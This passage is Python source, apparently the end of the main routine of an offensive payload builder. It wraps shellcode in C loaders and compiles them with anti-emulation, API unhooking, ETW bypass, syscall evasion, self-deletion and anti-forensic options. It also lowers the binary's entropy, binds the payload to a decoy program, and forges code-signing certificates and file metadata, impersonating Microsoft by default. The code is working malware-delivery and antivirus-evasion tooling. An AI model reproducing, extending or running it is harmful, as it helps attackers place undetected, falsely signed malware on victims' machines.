    parser.add_argument('-s', '--sign-certificate', nargs='?', const='ask_user', 
                        help='Optional: Sign the output binary and copy metadata from another binary to your output. If a website or filepath is provided, use it. Defaults to interactive mode if no argument is provided.')


    parser.add_argument(
        '-dh', '--detect-hooks',
        action='store_true',
        help='Compile a small tool called check_hook.exe for detecting inline/IAT/EAT hooks. This tool can detect both native API and export function hooks.'
    )


    ### todo: consider add another post-compiled obfuscation from BH Europe 24 here: 
    # ./notpacked++ alice_notepad.exe --raw-size --fill-sections --rename-sections
    # Above, only those 3 options can be used, another option will corrupt the binary. 

    args = parser.parse_args()


    print_selected_options(args)


    if args.detect_hooks:
        compile_unhook_iat()
        sys.exit()

    if args.input_file.endswith('.bin'):
        print("The input file ends with .bin")
        choice = input("Choose your Position Independent Code converter:\n1) donut\n2) stardust\nEnter your choice (1 or 2): ")
        
        if choice == '1':
            args.shellcode_type = 'donut'
            print("Shellcode type set to donut.")
        elif choice == '2':
            args.star_dust = True
            print("Star dust set to True.")
        else:
            print("Invalid choice. Default to donut.")
            args.shellcode_type = 'donut'
    else:
        print("Input file is not a raw shellcode ends with .bin")

    # Adjust shellcode_file name based on the shellcode type
    # TODO: Add more shellcode PIC generators here:
    if args.shellcode_type == 'donut':
        shellcode_file = 'note_donut'
    elif args.shellcode_type == 'pe2sh':
        shellcode_file = 'note_pe2sh'
    elif args.shellcode_type == 'rc4':
        shellcode_file = 'note_rc4'
    elif args.shellcode_type == 'amber':
        shellcode_file = 'note_amber'
    elif args.shellcode_type == 'shoggoth':
        shellcode_file = 'note_shoggoth'
    elif args.shellcode_type == 'augment':
        shellcode_file = 'note_augment'
    else:
        # Default case, though this should never be hit due to argparse choices constraint
        shellcode_file = 'note_donut'


    if args.star_dust:
        handle_star_dust(args.input_file)
        # Change input file to the generated boaz.x64.bin for further processing
        args.input_file = 'boaz.x64'

    generate_shellcode(args.input_file, shellcode_file, args.shellcode_type, args.encode_sgn, args.encoding, args.star_dust)
    if args.star_dust:
        shellcode_file = f'boaz.x64'
    shellcode = read_shellcode(shellcode_file)
    # print shellcode_file
    # print(f"[!]  Shellcode file: {shellcode_file}")

    template_loader_path = f'loaders/loader_template_{args.loader}.c' if args.loader != 1 else 'loaders/loader1.c'
    output_loader_path = f'loaders/loader{args.loader}_modified.c' if args.loader != 1 else 'loaders/loader1_modified.c'
    
    ### Deal with syswhisper option:
    # Determine if SysWhisper-specific handling is required
    use_syswhisper = args.syswhisper is not None or args.loader == 15

    if use_syswhisper:
        # Override loader template and output paths for SysWhisper or loader 15
        template_loader_path = 'loaders/loader_template_15.c'
        output_loader_path = 'loaders/loader15_modified.c'


    if args.output_file:
        output_file_path = args.output_file
        output_dir = os.path.dirname(output_file_path) or '.'  # Use current directory if no directory is specified

        # The os.makedirs call with exist_ok=True ensures that the directory is created if it does not exist,
        # and does nothing if it already exists, preventing any FileNotFoundError
        os.makedirs(output_dir, exist_ok=True)
    else:
        # If no -o option is provided, use the ./output directory
        print("No output file specified. Using the default ./output directory.\n")
        output_dir = './output'
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        # Generate a random filename for the output file
        random_filename = generate_random_filename() + '.exe'
        output_file_path = os.path.join(output_dir, random_filename)

    file_name = os.path.basename(output_file_path)



    # print(f"Output file name: {file_name}")
    ##print the args.encoding:
    # print(f"using encoding option: {args.encoding}")
    # write_loader(template_loader_path, shellcode, shellcode_file, args.shellcode_type, output_loader_path, args.sleep, args.anti_emulation, args.junk_api, args.api_unhooking, args.god_speed, args.encoding)
    write_loader(template_loader_path, shellcode, shellcode_file, args.shellcode_type, output_loader_path, args.sleep, args.anti_emulation, args.junk_api, args.api_unhooking, args.god_speed, args.encoding, args.dream, file_name, args.etw, compile_as_dll=args.dll, compile_as_cpl=args.cpl, star_dust = args.star_dust, self_deletion=args.self_deletion, anti_forensic=args.anti_forensic, cfg=args.control_flow_guard)

    if args.obfuscate:
        print("Obfuscating the loader code...\n")
        run_obfuscation(output_loader_path)
        obfuscated_loader_path = output_loader_path.replace('.c', '_obf.c')
    else:
        # If obfuscation is not applied, use the original loader path
        obfuscated_loader_path = output_loader_path

    
    ## if compile_as_dll is set, change the output name to a .dll file:
    if args.dll:
        output_file_path = output_file_path.replace('.exe', '.dll')
        print("Compiling as a DLL file... \n")
    elif args.cpl:
        output_file_path = output_file_path.replace('.exe', '.cpl')
        print("Compiling as a CPL file... \n")


    ##print the output_file_path
    print(f"Output file path: {output_file_path}")
    if use_syswhisper:
        compile_with_syswhisper(obfuscated_loader_path, output_file_path, args.syswhisper if args.syswhisper is not None else 1, args.sleep, args.anti_emulation, args.junk_api, args.compiler, args.api_unhooking, args.god_speed, args.encoding, args.dream, args.etw, args.self_deletion, args.anti_forensic, cfg=args.control_flow_guard)
    else:
        compile_output(obfuscated_loader_path, output_file_path, args.compiler, args.sleep, args.anti_emulation, args.junk_api, args.api_unhooking, args.mllvm, args.god_speed, args.encoding, args.loader, args.dream, args.etw, args.dll, args.cpl, args.self_deletion, args.anti_forensic, cfg=args.control_flow_guard, icon=args.icon)



    ## uncomment the below line to clean up obfuscation code base: 
    ## you can retain them to inspect changes made. 
    # cleanup_files(output_loader_path, output_loader_path.replace('.c', '_obf.c'))

    ### Reduce the entropy to 6.1: 
    if args.entropy == 1:
        # Run null_byte.py on the output binary
        subprocess.run(['python3', './entropy/null_byte.py', output_file_path], check=True)
    elif args.entropy == 2:
        # Run pokemon.py on the output binary
        subprocess.run(['python3', './entropy/pokemon.py', output_file_path], check=True)
    elif args.entropy == 0:
        print("[-] No entropy reduction applied.\n")

    if args.binder:
        temp_output_file_path = output_file_path.replace('.exe', '_temp.exe')
        binder_utility = args.binder if args.binder else 'binder/calc.exe'
        subprocess.run(['wine', 'binder/binder.exe', output_file_path, binder_utility, binder_utility, '-o', temp_output_file_path], check=True)
        ## rename temp file back to original:
        os.rename(temp_output_file_path, output_file_path)

    if args.obfuscate_api:
        obfuscate_with_api(output_file_path)
    elif not args.obfuscate_api:
        ## strip the binary, if not obfuscating the API. Because the obfuscation tool will not be compatiable with the format. 
        print("Stripping the binary to reduce its size and potentially increase its stealth.")
        # strip_binary(output_file_path)

    ## Add watermark to the binary:
    # args.watermark = bool(args.watermark)
    # if args.watermark:
    #     add_watermark(output_file_path)


    def sign_with_carbon_copy(website, output_file_path, signed_output_file_path):
        carbon_copy_command = f"python3 signature/CarbonCopy.py {website} 443 {output_file_path} {signed_output_file_path}"
        subprocess.run(carbon_copy_command, shell=True, check=True)
        ## clean up files in certs folder in current directory, the cleanup files
        cleanup_files('certs/')


    def sign_with_mangle(file_path, output_file_path, signed_output_file_path):
        mangle_command = f"./signature/Mangle -C {file_path} -I {output_file_path} -O {signed_output_file_path} -M"
        subprocess.run(mangle_command, shell=True, check=True)
    
    def sign_with_metatwin(meta_source_file, output_file_path):
        ## metatwin command is: "python3 metatwin.py ../Bob-and-Alice/signature/Desktops.exe  ../Bob-and-Alice/alice_notepad.exe"
        metatwin_command = f"python3 signature/metatwin.py {meta_source_file} {output_file_path}"
        subprocess.run(metatwin_command, shell=True, check=True)

    if args.sign_certificate:
        signed_output_file_path = "signed_" + os.path.basename(output_file_path)

        # Check for overwrite
        if os.path.exists(signed_output_file_path):
            overwrite = input(f"The file '{signed_output_file_path}' already exists. Do you want to overwrite it? (Y/N): ").strip().upper()
            if overwrite == 'Y' or overwrite == '':
                os.remove(signed_output_file_path)
            elif overwrite == 'N':
                print("Exiting the signing process as per user request.")
                exit()
            else:
                print("Invalid input. Exiting the signing process.")
                exit()

        # Handle user interactions for certificate signing
        if args.sign_certificate == 'ask_user':
            response = input("Choose the signing method - Vendor (2) or Mangle (1) or MetaTwin (0): ").strip()
            if response == '2':
                vendor_name = input("Enter the vendor website or press enter for default (www.microsoft.com): ").strip()
                vendor_name = vendor_name if vendor_name else 'www.microsoft.com'
                sign_with_carbon_copy(vendor_name, output_file_path, signed_output_file_path)
            elif response == '1':
                program_path = input("Enter the program path or press enter for default (./signature/Desktops.exe): ").strip()
                program_path = program_path if program_path else './signature/Desktops.exe'
                sign_with_mangle(program_path, output_file_path, signed_output_file_path)
            elif response == '0':
                meta_source_file = input("Enter the source file path or press enter for default (./signature/Desktops.exe): ").strip()
                meta_source_file = meta_source_file if meta_source_file else './signature/Desktops.exe'
                sign_with_metatwin(meta_source_file, output_file_path)

            else:
                print("Invalid option. Exiting.")
                exit()
        elif os.path.isfile(args.sign_certificate):
            # sign_with_mangle(args.sign_certificate, output_file_path, signed_output_file_path)
            sign_with_metatwin(args.sign_certificate, output_file_path)
            # add signed_res_ to original binary name.
        else:
            sign_with_carbon_copy(args.sign_certificate, output_file_path, signed_output_file_path)
        ## if we use response 0, our signed output binary will be signed_res_ added to the original output file name, we ned to reflect that:
        if response == '0':
            signed_output_file_path = "signed_res_" + os.path.basename(output_file_path)
        print(f"\033[95m [+] Signed binary generated \033[0m: \033[92m{signed_output_file_path}\033[0m")
        

    ## calculate the final output file hash in red colour:
    print(f"[+] Final output file hash: \033[91m{hashlib.md5(open(output_file_path, 'rb').read()).hexdigest()}\033[0m")





    






if __name__ == '__main__':
    main()










            #                     ,**///////**,                                   
            #              /@@@@@@@@@@@@@@@&&&%%%###%(                            
            #              @@@@@@@@@@@@@@@@&&&%%####&%                            
            #              @@@@@@@@@@@@@@@@@@&&%%##(((                            
            #              @@@@@@@@@@@@@@@@@@&&%%##(((                            
            #              @@@@@@@@@@@@@@@@@@&&%%##(((                            
            #              @@@@@@@@@@@@@@@@@@&&%%##(((                            
            #             (@@@@@@@@@@@@@@@@@@&&%%##(((&,                          
            #          #@@@@@@@@@@@@@@@@@@@@@@&%%###((###%,                       
            #         %@@@@@@@@@@@@@@@@@@@@@@@&&%#####%%%%%.                      
            #         ,@@@@@@@@@@@@@@@@@@@@@@@@&&&&&&%%%%%&                       
            #           /@@@@@@@@@@@@@@@@@@@@@@@@&&&&&&&&                         
            #           (@&&&@@@@@@@@@@@@@@@@@@@@@@&%####*                        
            #           (@@@@@&&&////////////((((#########                        
            #           *@@%#@@@&((///////((((((########%(                        
            #            #@%####((((((((((((((#######%##%                         
            #             .(%%%####################%%(#%                          
            #               .%%%%%#############%%%%((%/                           
            #                  #%%%%%%%%%%%%%%%#((%%#*.                           
            #                /%%%%(%%%%%####%%%%%#/,*%##%&(                       
            #            ,&&&&%%%%#%*,,,*/(((((#(,,#(/%##%&&@/                    
            #          %&&&@&&&&%%###%,,****,*%(#&&@@&###%%&@@@(                  
            #        %@@@@@@@@&&&%%%###(,@@@&@@&%*/#%#.##%%&@@@@&.                
            #      ,@@@@@@@@@&@&&&%%%##(#*%@*         .##%%&@@@@@&.               
            #     *@@@@@@@@@@&&&@&&%%%##(((.           ##%%&&@@@@@%               
            #    .@&@@@@@@@@&&&%%%&&%%%##((//          ##%%&&@@@@&@*...           
            #    &&@@@@@@@&&&&&%%%#&&&%%##(((/*        #%%%&&&@&&&&(.....         
            #   .@@@@@@@@@&&&&%%%####&&%%%##(((/,     .%%%&&&@@&&&&%....          
            #   ,@@@@@@@@@@&&&%%%#####%&&%%%##((((.   .%%&&&@&&&&&&#...           
            #   ,@@@@@@@@@@&&&%%%%%#####&&&%%%####((  .%&&&@&&&&&&/..             
            #   .@@@@@@@@@@&&&&%%%%%%%%%%%&&&%%%%%###/.&&@&&&&&&*..               
            #    (@@@@@@@@@@&&&&&%%%%%%%%%%%%&&&&%%%%%%@&&&&%*..                  
            #     .#@@@@@@@@&&&&&&%%%%%%%%%%%%%%%&%%&&&&/,.                       
            #       .,*#&@@@&&&&&&&&%%%%%%%%&&&&%(*...                            
            #             .,,**********,,...                                      
                                                    
                                                    
                                                    